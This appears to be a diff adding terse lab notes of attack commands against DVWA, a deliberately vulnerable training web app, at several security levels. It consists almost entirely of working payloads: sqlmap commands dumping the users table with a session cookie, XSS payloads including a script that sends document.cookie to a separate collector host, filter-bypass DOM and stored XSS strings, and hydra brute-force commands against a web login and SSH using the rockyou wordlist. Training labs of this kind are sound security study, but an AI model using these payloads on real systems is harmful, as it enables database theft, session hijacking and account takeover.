@@ -1,0 +1,49 @@
+medium 
+sql blind using burpsuite
+
+sqlmap -u "http://192.168.1.47:5566/vulnerabilities/sqli_blind/" 
+--cookie="PHPSESSID=um3cs6ju9auv1sltfsne18qop1; security=medium" --data="id=3&Submit=Submit" --dump
+
+sqlmap -u "http://192.168.1.47:5566/vulnerabilities/sqli_blind/" 
+--cookie="PHPSESSID=um3cs6ju9auv1sltfsne18qop1; security=medium" --data="id=3&Submit=Submit" 
+--dbms=mysql -D dvwa -tables
+
+sqlmap -u "http://192.168.1.47:5566/vulnerabilities/sqli_blind/" 
+--cookie="PHPSESSID=um3cs6ju9auv1sltfsne18qop1; security=medium" --data="id=3&Submit=Submit" 
+--dbms=mysql -D dvwa -T users --columns
+
+sqlmap -u "http://192.168.1.47:5566/vulnerabilities/sqli_blind/" 
+--cookie="PHPSESSID=um3cs6ju9auv1sltfsne18qop1; security=medium" --data="id=3&Submit=Submit" 
+--dbms=mysql -D dvwa -T users --dump
+
+
+<script>location.href="http://192.168.1.46:88/cookie.php?cookie="+document.cookie;</script>
+
+http://192.168.1.47:5566/vulnerabilities/xss_r/?name=%3Cscript%3Elocation.href=%22http://192.168.1.46:89/cookie.php?cookie=%22+document.cookie;%3C/script%3E
+
+
+<body onload=alert("iacsd")>
+
+dom xss medium 
+</option></select><body onload=alert("IACSD")>
+
+
+dom xss high
+(choose different language)#<script>alert(0)</script>
+
+stored xss medium
+in name field
+<scRipt>alert(0)</scRipt>
+
+stored xss high
+in name field
+<body onload=alert("virus...")>
+
+Command Injection
+
+
+brute force using hydra low
+hydra 192.168.1.47 -l pablo -P /usr/share/wordlists/rockyou.txt http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:security=low; PHPSESSID=u5ec9c90k9tlm609ncqg76du02" -s 5566
+
+
+hydra -l shuhari -P pass ssh://192.168.1.47
